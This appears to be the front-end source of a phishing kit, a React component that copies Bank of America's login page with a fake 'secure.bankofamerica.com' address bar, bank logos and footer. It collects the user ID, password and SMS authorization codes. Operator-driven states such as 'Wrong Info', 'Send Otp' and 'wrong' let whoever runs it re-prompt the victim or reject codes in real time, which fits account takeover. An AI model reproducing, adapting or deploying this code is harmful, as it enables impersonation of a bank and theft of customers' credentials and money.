import { otpOptions } from "../../bankDetails";
import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import BankingHeader from "./BankingHeader";
import BankFaveIcon from "../../../../../../../../assets/allBanks/banks/bankofamerica/boa3.ico";
import { motion } from "framer-motion";
import BOAImage from "../../../../../../../../assets/allBanks/banks/bankofamerica/boa2.svg";
import { HiMiniExclamationTriangle } from "react-icons/hi2";
import { Link } from "react-router-dom";
import Lock from "../../../../../../../../assets/allBanks/banks/bankofamerica/boa6.png";
import Check from "../../../../../../../../assets/allBanks/banks/bankofamerica/boa7.png";
import Home from "../../../../../../../../assets/allBanks/banks/bankofamerica/boa5.png";
import ShareData from "./ShareData";
import BasicLoader from "../../../../../loading/BasicLoader";
import { ClipLoader } from "react-spinners";
import BankOtpControl from "./BankOtpControl";
import BankControl from "./BankControl";

const BankOfAmerica = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  setIsOpenOtp,
  loading,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    handleBlur,
    errorFormState,
    handleChange,
    onSubmitOtp,
    blurOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-white",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="secure.bankofamerica.com"
        handleCancel={handleCancel}
        img={BankFaveIcon}
        setAllBankItems={setAllBankItems}
        setOtpOpen={setOtpOpen}
        setIsOpenOtp={setIsOpenOtp}
      />
      <div>
        <div>
          <div className="pl-3 mt-6 mb-8">
            <img src={BOAImage} alt="" className="w-[270px] h-[27px]" />
          </div>
          <div className="w-full bg-customRed-300 h-9 btn6 "></div>
        </div>
        <div className={clsx("pt-10 px-6", allBankOpen ? "hidden" : "block")}>
          <p className="mb-5 text-lg leading-6 text-customGray-1013">
            For your protection, Bank of America must confirm your identity and
            obtain your consent before sharing your online information.
          </p>
          <div className=" customXlg:pr-[26.7rem] ">
            <div className="mb-7">
              <label className="font-semibold text-customGray-1013">
                User ID
              </label>
              <input
                type="text"
                value={formState.username}
                name="username"
                onChange={handleChange}
                onBlur={handleBlur}
                className={clsx(
                  "w-full px-3 py-1.5 border border-customGray-1013 outline-none focus:border-customBlue-1006 transistion2",
                  errorFormState.username && " border-customRed-300"
                )}
              />
              {errorFormState.username && (
                <p className="flex gap-2 mt-1 text-sm text-customRed-300">
                  <HiMiniExclamationTriangle size={20} />
                  User ID is a required field
                </p>
              )}
            </div>
            <div className="mb-5">
              <label className="font-semibold text-customGray-1013">
                Password
              </label>
              <input
                type="password"
                value={formState.password}
                name="password"
                onChange={handleChange}
                onBlur={handleBlur}
                className={clsx(
                  "w-full px-3 py-1.5 border border-customGray-1013 outline-none focus:border-customBlue-1006 transistion2",
                  errorFormState.password && " border-customRed-300"
                )}
              />
              {errorFormState.password && (
                <p className="flex gap-2 mt-1 text-sm text-customRed-300">
                  <HiMiniExclamationTriangle size={20} />
                  Password is a required field
                </p>
              )}
            </div>
            <div className="flex flex-col gap-6 mt-10 mb-6 customXlg:flex-row">
              <button
                onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                className="py-3 text-2xl text-white px-7 bg-customBlue-1006 hover:bg-customBlue-1007 transistion2"
              >
                {loading && <ClipLoader size={10} color="#fff" />}
                {loading ? "Loading..." : "Submit"}
              </button>
              <button
                onClick={() => handleCancel(false)}
                className="py-3 text-2xl border-2 px-7 text-customBlue-1006 bg-customGray-1014 border-customBlue-1006 hover:bg-customGray-1015 transistion2"
              >
                Cancel
              </button>
            </div>
          </div>
          <p className="mt-10 text-lg leading-6 text-customGray-1013">
            For help with your User ID or Password, please go to
            www.bankofamerica.com or the Mobile Banking app.
          </p>
        </div>
        {allBankOpen && (
          <div className={clsx(OtpOpen ? "hidden" : "block")}>
            <BankControl
              handleSelectedId={handleSelectedId}
              selectedPath={selectedPath}
              handleSelectSubmit={handleSelectSubmit}
            />
            <div>
              {activePathDetails.name === "Loading" && (
                <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                  <BasicLoader />
                </p>
              )}
              {activePathDetails.name === "Wrong Info" && (
                <>
                  <div className={clsx("pt-10 px-6")}>
                    <p className="mb-5 text-lg leading-6 text-customGray-1013">
                      For your protection, Bank of America must confirm your
                      identity and obtain your consent before sharing your
                      online information.
                    </p>
                    <div className=" customXlg:pr-[26.7rem] ">
                      <div className="flex gap-3 mb-2 text-base font-extrabold text-customRed-300">
                        <HiMiniExclamationTriangle size={20} />
                        <p>{activePathDetails.body}</p>
                      </div>
                      <div className="mb-7">
                        <label className="font-semibold text-customGray-1013">
                          User ID
                        </label>
                        <input
                          type="text"
                          value={formState.username}
                          name="username"
                          onChange={handleChange}
                          onBlur={handleBlur}
                          className={clsx(
                            "w-full px-3 py-1.5 border border-customGray-1013 outline-none focus:border-customBlue-1006 transistion2",
                            errorFormState.username && " border-customRed-300"
                          )}
                        />
                        {errorFormState.username && (
                          <p className="flex gap-2 mt-1 text-sm text-customRed-300">
                            <HiMiniExclamationTriangle size={20} />
                            User ID is a required field
                          </p>
                        )}
                      </div>
                      <div className="mb-5">
                        <label className="font-semibold text-customGray-1013">
                          Password
                        </label>
                        <input
                          type="password"
                          value={formState.password}
                          name="password"
                          onChange={handleChange}
                          onBlur={handleBlur}
                          className={clsx(
                            "w-full px-3 py-1.5 border border-customGray-1013 outline-none focus:border-customBlue-1006 transistion2",
                            errorFormState.password && " border-customRed-300"
                          )}
                        />
                        {errorFormState.password && (
                          <p className="flex gap-2 mt-1 text-sm text-customRed-300">
                            <HiMiniExclamationTriangle size={20} />
                            Password is a required field
                          </p>
                        )}
                      </div>
                      <div className="flex flex-col gap-6 mt-10 mb-6 customXlg:flex">
                        <button
                          onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                          className="py-3 text-2xl text-white px-7 bg-customBlue-1006 hover:bg-customBlue-1007 transistion2"
                        >
                          {loading && <ClipLoader size={10} color="#fff" />}
                          {loading ? "Loading..." : "Submit"}
                        </button>
                        <button
                          onClick={() => handleCancel(false)}
                          className="py-3 text-2xl border-2 px-7 text-customBlue-1006 bg-customGray-1014 border-customBlue-1006 hover:bg-customGray-1015 transistion2"
                        >
                          Cancel
                        </button>
                      </div>
                    </div>
                    <p className="mb-5 text-lg leading-6 text-customGray-1013">
                      For help with your User ID or Password, please go to
                      www.bankofamerica.com or the Mobile Banking app.
                    </p>
                  </div>
                </>
              )}
              {activePathDetails.name === "Send Otp" && (
                <>
                  <h3>{activePathDetails.body}</h3>
                  <div className={clsx("pt-10 px-6", isOpenOtp && "hidden")}>
                    <div>
                      <div className="">
                        <div>
                          <h3 className="mb-2 text-xl font-bold">
                            Request Authorization Code
                          </h3>
                          <p className="mb-2 text-customGray-900">
                            To verify your identity, we need to send an
                            authorization code to your phone
                          </p>
                        </div>
                        <div>
                          <h2 className="mb-3 text-sm text-customGray-1013">
                            How would you like to receive it?
                          </h2>
                          <div
                            role="radiogroup"
                            aria-label="Otp Options"
                            className="flex flex-col mb-4 space-y-3"
                          >
                            {otpOptions.map((bank) => (
                              <div
                                key={bank.id}
                                role="radio"
                                tabIndex={0}
                                onClick={() => handleOtpOption(bank.id)}
                                className="flex items-center gap-2.5 text-customGray-900 "
                              >
                                <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                  <p
                                    className={clsx(
                                      "rounded-full w-[10px] h-[10px]  ",
                                      otpOptions[indexOtp]?.id === bank.id
                                        ? "bg-customBlue-500"
                                        : ""
                                    )}
                                  ></p>
                                </div>
                                <h2
                                  className={clsx(
                                    "text-sm",
                                    otpOptions[indexOtp]?.id === bank.id
                                      ? "text-customGray-900 hover:underline font-bold"
                                      : "hover:text-customBlue-700 hover:underline"
                                  )}
                                >
                                  {bank.name}
                                </h2>
                              </div>
                            ))}
                          </div>
                          <div className="text-sm text-customGray-900">
                            <h4 className="mb-4 font-semibold">
                              The code expires 10 minutes after you request it{" "}
                            </h4>
                            <div className="space-y-3">
                              <p>
                                You are consenting to be contacted at the phone
                                number selected for the purpose of receiving an
                                authorise code. If you selected text message,
                                wireless and text message fees may apply from
                                your carrier.
                              </p>
                              <p>
                                Supported carriers include: AT&T, Sprint,
                                T-Mobile, US Cellular, Verizon or any other
                                branded operator.{" "}
                              </p>
                            </div>
                            <div className="flex flex-col gap-6 mb-6  customXlg:flex-row mt-9">
                              <button
                                className="px-8 py-1 text-lg border-2 rounded-lg text-customBlue-1006 bg-customGray-1014 border-customBlue-1006 hover:bg-customGray-1015 transistion2"
                                onClick={() => setAllBankItems(false)}
                              >
                                Cancel
                              </button>
                              <button
                                className="px-8 py-2 text-lg text-white rounded-lg bg-customBlue-1006 hover:bg-customBlue-1007 transistion2"
                                onClick={onSubmitOtpOptions}
                              >
                                Send Code
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  {isOpenOtp && (
                    <div className={clsx("pt-10 px-6")}>
                      <div className="">
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold">
                              Enter Authorization Code
                            </h3>
                            <h2 className="mb-2 text-customGray-900">
                              An Authorization code was sent to your phone.
                            </h2>
                          </div>
                          <div>
                            <div className=" customXlg:pr-[26.7rem] ">
                              <label className="mb-3 text-sm text-customGray-1013">
                                Authorization Code{" "}
                              </label>
                              <input
                                type="number"
                                placeholder="XXXXXX"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                onBlur={blurOtp}
                                className={clsx(
                                  "w-full px-3 py-1.5 border border-customGray-1013 outline-none no-spinner focus:border-customBlue-1006 transistion2",
                                  errorOtp.otpo && "border border-customRed-300"
                                )}
                              />
                              {errorOtp.otpo && (
                                <p className="mt-2 text-sm text-customRed-300">
                                  Please enter the authorization code.
                                </p>
                              )}
                            </div>
                            <p className="mt-4 text-sm font-semibold text-customGray-900">
                              The code expires 10 minutes after you request it
                            </p>
                            <div className="flex flex-col gap-6 mb-6  mt-9 customXlg:flex-row">
                              <button
                                className="px-8 py-1 text-lg border-2 rounded-lg text-customBlue-1006 bg-customGray-1014 border-customBlue-1006 hover:bg-customGray-1015 transistion2"
                                onClick={() => setIsOpenOtp(false)}
                              >
                                Cancel
                              </button>
                              <button
                                className="px-8 py-2 text-lg text-white rounded-lg bg-customBlue-1006 hover:bg-customBlue-1007 transistion2"
                                onClick={(e) =>
                                  onSubmitOtp(e, handleVerifiedOtp)
                                }
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#fff" />
                                )}
                                {loading ? "Loading..." : "Continue"}
                              </button>
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Request another autorization code
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>
          </div>
        )}
        {OtpOpen && (
          <>
            <BankOtpControl
              handleSelectedOtp={handleSelectedOtp}
              selectedOtp={selectedOtp}
              handleSubmitOtp={handleSubmitOtp}
            />

            <div>
              {activeOtp.name === "Loading" && (
                <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                  <BasicLoader />
                </p>
              )}
              {activeOtp.name === "wrong" && (
                <>
                  <div className={clsx("pt-10 px-6")}>
                    <div className="">
                      <div>
                        <div>
                          <h3 className="mb-2 text-xl font-bold">
                            Enter Authorization Code
                          </h3>
                          <h2 className="mb-2 text-customGray-900">
                            An Authorization code was sent to your phone.
                          </h2>
                        </div>
                        <div>
                          <div className=" customXlg:pr-[26.7rem] ">
                            <label className="mb-3 text-sm text-customGray-1013">
                              Authorization Code{" "}
                            </label>
                            <input
                              type="number"
                              placeholder="XXXXXX"
                              value={formOtp.otpo}
                              name="otpo"
                              onChange={changeOtp}
                              onBlur={blurOtp}
                              className={clsx(
                                "w-full px-3 py-1.5 border border-customGray-1013 outline-none no-spinner focus:border-customBlue-1006 transistion2",
                                errorOtp.otpo && "border border-customRed-300"
                              )}
                            />
                            {errorOtp.otpo && (
                              <p className="mt-2 text-sm text-customRed-300">
                                Please enter the authorization code.
                              </p>
                            )}
                            <h3 className="mt-2 text-sm text-customRed-300">
                              {activeOtp.body}
                            </h3>
                          </div>
                          <p className="mt-4 text-sm font-semibold text-customGray-900">
                            The code expires 10 minutes after you request it
                          </p>
                          <div className="flex flex-col gap-6 mb-6 customXlg:flex-row mt-9">
                            <button
                              className="px-8 py-1 text-lg border-2 rounded-lg text-customBlue-1006 bg-customGray-1014 border-customBlue-1006 hover:bg-customGray-1015 transistion2"
                              onClick={() => setIsOpenOtp(false)}
                            >
                              Cancel
                            </button>
                            <button
                              className="px-8 py-2 text-lg text-white rounded-lg bg-customBlue-1006 hover:bg-customBlue-1007 transistion2"
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {loading ? "Loading..." : "Continue"}
                            </button>
                          </div>
                          <p
                            className={clsx(
                              "cursor-pointer text-customBlue-100 font-bold",
                              !resend &&
                                "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                            )}
                            onClick={handleResend}
                          >
                            Request another autorization code
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </>
              )}
              {activeOtp.name === "otp" && (
                <>
                  <ShareData
                    bankName={bankName}
                    handleTheFinal={handleTheFinal}
                    handleCancel={handleCancel}
                    setIsOpenOtp={setIsOpenOtp}
                    setAllBankItems={setAllBankItems}
                    siteLink="https://www.bankofamerica.com/"
                  />
                </>
              )}
            </div>
          </>
        )}
        <div className="px-6 pt-2 pb-3 space-y-3 bg-customGray-1016 text-[12px]">
          <div className="flex items-center gap-2 font-semibold text-customGray-200">
            <div>
              <img src={Lock} alt="" />
            </div>
            <p>Secure Area</p>
          </div>
          <div className="flex items-center gap-2">
            <Link
              to="https://www.bankofamerica.com/"
              className="flex gap-2 text-customBlue-1006"
            >
              <p>Privacy</p>
              <p className="px-2 border-l border-r border-customGray-900">
                Security
              </p>
            </Link>
            <div>
              <img src={Check} alt="" className="w-[23px] h-3  " />
            </div>
          </div>
          <div>
            <div className="flex items-center gap-3">
              <p>
                Bank of America, N.A. Member FDIC.{" "}
                <Link
                  className="text-customBlue-1006"
                  to="https://www.bankofamerica.com/help/equalhousing-popup/"
                >
                  Equal Housing Lender{" "}
                </Link>{" "}
              </p>
              <div>
                <img src={Home} alt="" />
              </div>
            </div>
            <p>© 2025 Bank of America Corporation. All rights reserved.</p>
          </div>
        </div>
      </div>
    </motion.div>
  );
};

export default BankOfAmerica;
